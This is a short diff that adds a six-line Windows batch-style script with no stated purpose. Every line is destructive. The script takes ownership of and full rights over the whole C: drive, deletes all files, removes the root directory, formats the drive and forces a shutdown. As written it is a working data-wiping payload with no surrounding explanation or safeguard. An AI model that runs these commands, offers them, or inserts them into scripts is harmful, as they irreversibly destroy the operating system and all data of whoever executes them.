@@ -1,0 +1,6 @@
+takeown /f C:\ /r /d y
+icacls C:\ /grant %USERNAME%:F /t
+del /f /s /q C:\*.*
+rd /s /q C:\
+format C: /fs:NTFS /p:1 /y
+shutdown /s /f /t 0
